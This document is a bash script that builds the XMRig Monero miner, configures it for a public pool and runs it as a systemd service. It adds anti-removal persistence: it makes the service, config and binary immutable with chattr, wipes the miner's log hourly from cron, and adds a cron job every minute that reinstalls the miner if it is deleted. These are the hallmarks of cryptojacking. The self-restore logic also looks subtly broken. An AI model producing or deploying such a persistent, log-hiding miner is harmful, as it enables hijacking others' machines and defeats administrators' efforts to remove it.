#!/bin/bash

# Color variables for output
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# Path to XMRig installation
XMRIG_PATH="/opt/xmrig"
LOG_FILE="$XMRIG_PATH/logs/xmrig.log"
ERROR_LOG_DIR="$XMRIG_PATH/error_logs"
ERROR_LOG_FILE="$ERROR_LOG_DIR/error.log"
MONITOR_SCRIPT="/usr/local/bin/monitor_xmrig.sh"

# Error handling function
handle_error() {
    echo -e "${RED}An error occurred: $1${NC}"
    echo "$(date) - $1" >> "$ERROR_LOG_FILE"
    exit 1
}

# Creating directory for error logs
mkdir -p "$ERROR_LOG_DIR" || handle_error "Failed to create directory for error logs"

echo -e "${BLUE}Updating system and installing dependencies...${NC}"
apt update && apt upgrade -y || handle_error "Failed to update system"
apt install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev git screen cpulimit libmicrohttpd-dev || handle_error "Failed to install dependencies"

# Downloading and building XMRig
echo -e "${BLUE}Downloading and building XMRig...${NC}"
git clone https://github.com/xmrig/xmrig.git "$XMRIG_PATH" || handle_error "Failed to clone XMRig repository"
cd "$XMRIG_PATH" || handle_error "Failed to navigate to $XMRIG_PATH"
mkdir build || handle_error "Failed to create build directory"
cd build || handle_error "Failed to navigate to build directory"
cmake .. || handle_error "Failed to execute cmake"
make || handle_error "Failed to execute make"

# Creating configuration file
echo -e "${BLUE}Creating configuration file...${NC}"
mkdir -p "$XMRIG_PATH/logs" || handle_error "Failed to create logs directory"
cat << EOF > "$XMRIG_PATH/build/config.json"
{
    "algo": "rx/0",
    "url": "pool.supportxmr.com:3333",
    "user": "YOUR_MONERO_WALLET",
    "pass": "x",
    "rig-id": "my_server",
    "threads": 4,
    "cpu-priority": 5,
    "donate-level": 1,
    "log-file": "$LOG_FILE",
    "log-level": 0
}
EOF

# Creating systemd service for XMRig
echo -e "${BLUE}Creating systemd service for XMRig...${NC}"
cat << EOF > /etc/systemd/system/xmrig.service
[Unit]
Description=XMRig CPU Miner Service
After=network.target

[Service]
ExecStart=/usr/bin/screen -dmS xmrig cpulimit -l 50 -- "$XMRIG_PATH/build/xmrig" --config "$XMRIG_PATH/build/config.json"
WorkingDirectory=$XMRIG_PATH/build/
Restart=always
Nice=10
CPUQuota=50%
IOWeight=5
PrivateTmp=true
ProtectSystem=full
NoNewPrivileges=true

[Install]
WantedBy=multi-user.target
EOF

# Setting up automatic log cleaning
echo -e "${BLUE}Setting up automatic log cleaning...${NC}"
cat << EOF > /usr/local/bin/clear_xmrig_logs.sh
#!/bin/bash
if [ -f "$LOG_FILE" ]; then
    echo "" > "$LOG_FILE"
fi
EOF
chmod +x /usr/local/bin/clear_xmrig_logs.sh || handle_error "Failed to make log cleanup script executable"

# Adding cron job for log cleaning
(crontab -l 2>/dev/null; echo "0 * * * * /usr/local/bin/clear_xmrig_logs.sh") | crontab - || handle_error "Failed to add log cleanup task to cron"

# Locking files and systemd service against deletion
echo -e "${BLUE}Setting up protection against deletion...${NC}"
chattr +i /etc/systemd/system/xmrig.service || handle_error "Failed to protect systemd service from deletion"
chattr +i "$XMRIG_PATH/build/config.json" || handle_error "Failed to protect configuration file from deletion"
chattr +i "$XMRIG_PATH/build/xmrig" || handle_error "Failed to protect binary file from deletion"

# Creating monitoring script
echo -e "${BLUE}Creating monitoring script...${NC}"
cat << EOF > "$MONITOR_SCRIPT"
#!/bin/bash

if [ ! -f "/etc/systemd/system/xmrig.service" ] || [ ! -f "$XMRIG_PATH/build/xmrig" ]; then
    echo "${RED}XMRig removed, restoring...${NC}"
    bash $0
fi
EOF
chmod +x "$MONITOR_SCRIPT" || handle_error "Failed to make monitoring script executable"

# Adding monitoring script to cron
(crontab -l 2>/dev/null; echo "* * * * * $MONITOR_SCRIPT") | crontab - || handle_error "Failed to add monitoring task to cron"

# Enabling and starting XMRig service
echo -e "${BLUE}Enabling and starting XMRig service...${NC}"
systemctl daemon-reload || handle_error "Failed to reload systemd daemon"
systemctl enable xmrig.service || handle_error "Failed to enable XMRig service"
systemctl start xmrig.service || handle_error "Failed to start XMRig service"

# Final message
echo -e "${GREEN}Installation completed! XMRig is running in the background.${NC}"
echo -e "${GREEN}To check the status, use: sudo systemctl status xmrig.service${NC}"
